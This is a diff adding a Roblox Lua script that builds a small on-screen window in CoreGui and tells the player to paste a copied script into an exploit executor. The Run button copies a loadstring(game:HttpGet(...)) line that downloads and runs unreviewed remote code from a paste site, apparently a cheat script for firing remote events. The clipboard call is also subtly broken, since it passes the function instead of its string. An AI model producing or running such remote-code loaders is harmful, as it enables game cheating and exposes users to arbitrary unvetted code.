@@ -1,0 +1,170 @@
+local rema = game.CoreGui:FindFirstChild("Rema")
+
+if rema then
+	rema:Destroy()
+end
+
+local Converted = {
+	["_Rema"] = Instance.new("ScreenGui");
+	["_Frame"] = Instance.new("Frame");
+	["_DropShadowHolder"] = Instance.new("Frame");
+	["_DropShadow"] = Instance.new("ImageLabel");
+	["_TextLabel"] = Instance.new("TextLabel");
+	["_TextButton"] = Instance.new("TextButton");
+	["_UITextSizeConstraint"] = Instance.new("UITextSizeConstraint");
+	["_UICorner"] = Instance.new("UICorner");
+	["_LocalScript"] = Instance.new("LocalScript");
+	["_UIStroke"] = Instance.new("UIStroke");
+	["_UIStroke1"] = Instance.new("UIStroke");
+	["_Close"] = Instance.new("TextButton");
+	["_LocalScript1"] = Instance.new("LocalScript");
+	["_UIStroke2"] = Instance.new("UIStroke");
+}
+
+Converted["_Rema"].IgnoreGuiInset = true
+Converted["_Rema"].ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
+Converted["_Rema"].Name = "Rema"
+
+Converted["_Frame"].AnchorPoint = Vector2.new(1, 1)
+Converted["_Frame"].BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+Converted["_Frame"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_Frame"].BorderSizePixel = 0
+Converted["_Frame"].Position = UDim2.new(1, -50, 1, -50)
+Converted["_Frame"].Size = UDim2.new(0, 150, 0, 200)
+Converted["_Frame"].Parent = Converted["_Rema"]
+
+Converted["_DropShadowHolder"].BackgroundTransparency = 1
+Converted["_DropShadowHolder"].BorderSizePixel = 0
+Converted["_DropShadowHolder"].Size = UDim2.new(1, 0, 1, 0)
+Converted["_DropShadowHolder"].ZIndex = 0
+Converted["_DropShadowHolder"].Name = "DropShadowHolder"
+Converted["_DropShadowHolder"].Parent = Converted["_Frame"]
+
+Converted["_DropShadow"].Image = "rbxassetid://6015897843"
+Converted["_DropShadow"].ImageColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_DropShadow"].ImageTransparency = 0.5
+Converted["_DropShadow"].ScaleType = Enum.ScaleType.Slice
+Converted["_DropShadow"].SliceCenter = Rect.new(49, 49, 450, 450)
+Converted["_DropShadow"].AnchorPoint = Vector2.new(0.5, 0.5)
+Converted["_DropShadow"].BackgroundTransparency = 1
+Converted["_DropShadow"].BorderSizePixel = 0
+Converted["_DropShadow"].Position = UDim2.new(0.5, 0, 0.5, 0)
+Converted["_DropShadow"].Size = UDim2.new(1, 47, 1, 47)
+Converted["_DropShadow"].ZIndex = 0
+Converted["_DropShadow"].Name = "DropShadow"
+Converted["_DropShadow"].Parent = Converted["_DropShadowHolder"]
+
+Converted["_TextLabel"].Font = Enum.Font.Unknown
+Converted["_TextLabel"].Text = "Click 'Run' to copy the script, paste the script into your executor script editor."
+Converted["_TextLabel"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextLabel"].TextScaled = true
+Converted["_TextLabel"].TextSize = 10
+Converted["_TextLabel"].TextStrokeTransparency = 0
+Converted["_TextLabel"].TextWrapped = true
+Converted["_TextLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextLabel"].BackgroundTransparency = 1
+Converted["_TextLabel"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextLabel"].BorderSizePixel = 0
+Converted["_TextLabel"].Size = UDim2.new(1, 0, 1, -150)
+Converted["_TextLabel"].Parent = Converted["_Frame"]
+
+Converted["_TextButton"].Font = Enum.Font.Unknown
+Converted["_TextButton"].Text = "RUN"
+Converted["_TextButton"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_TextButton"].TextScaled = true
+Converted["_TextButton"].TextSize = 20
+Converted["_TextButton"].TextStrokeTransparency = 0
+Converted["_TextButton"].TextWrapped = true
+Converted["_TextButton"].AnchorPoint = Vector2.new(0.5, 0)
+Converted["_TextButton"].BackgroundColor3 = Color3.fromRGB(170.0000050663948, 0, 0)
+Converted["_TextButton"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_TextButton"].BorderSizePixel = 0
+Converted["_TextButton"].Position = UDim2.new(0.5, 0, 1, -100)
+Converted["_TextButton"].Size = UDim2.new(1, -25, 1, -150)
+Converted["_TextButton"].Parent = Converted["_Frame"]
+
+Converted["_UITextSizeConstraint"].MaxTextSize = 20
+Converted["_UITextSizeConstraint"].Parent = Converted["_TextButton"]
+
+Converted["_UICorner"].Parent = Converted["_TextButton"]
+
+Converted["_UIStroke"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+Converted["_UIStroke"].Parent = Converted["_TextButton"]
+
+Converted["_UIStroke1"].Parent = Converted["_Frame"]
+
+Converted["_Close"].Font = Enum.Font.Unknown
+Converted["_Close"].Text = "X"
+Converted["_Close"].TextColor3 = Color3.fromRGB(255, 255, 255)
+Converted["_Close"].TextScaled = true
+Converted["_Close"].TextSize = 20
+Converted["_Close"].TextStrokeTransparency = 0
+Converted["_Close"].TextWrapped = true
+Converted["_Close"].AnchorPoint = Vector2.new(0, 1)
+Converted["_Close"].BackgroundColor3 = Color3.fromRGB(170.0000050663948, 0, 0)
+Converted["_Close"].BorderColor3 = Color3.fromRGB(0, 0, 0)
+Converted["_Close"].BorderSizePixel = 0
+Converted["_Close"].Position = UDim2.new(0, 0, 1, 0)
+Converted["_Close"].Size = UDim2.new(0, 20, 0, 20)
+Converted["_Close"].Name = "Close"
+Converted["_Close"].Parent = Converted["_Frame"]
+
+Converted["_UIStroke2"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+Converted["_UIStroke2"].Parent = Converted["_Close"]
+
+Converted["_Rema"].Parent = game.CoreGui
+
+local fake_module_scripts = {}
+
+local function LUXQRU_fake_script() -- Fake Script: Workspace.Rema.Frame.TextButton.LocalScript
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+    script.Parent = Converted["_TextButton"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
+
+	local function txt()
+		local script = "loadstring(game:HttpGet('https://rentry.co/fireremoteevent/raw'))()"
+		return script
+	end
+	
+	function toClipboard(String)
+		local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+		if clipBoard then
+			clipBoard(String)
+			print('Clipboard, Copied to clipboard')
+		else
+			print('Clipboard, Your exploit does not have the ability to use the clipboard')
+		end
+	end
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		toClipboard(txt)
+	end)
+end
+local function KIZMYV_fake_script() -- Fake Script: Workspace.Rema.Frame.Close.LocalScript
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+    script.Parent = Converted["_Close"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent:Destroy()
+	end)
+end
+
+coroutine.wrap(LUXQRU_fake_script)()
+coroutine.wrap(KIZMYV_fake_script)()
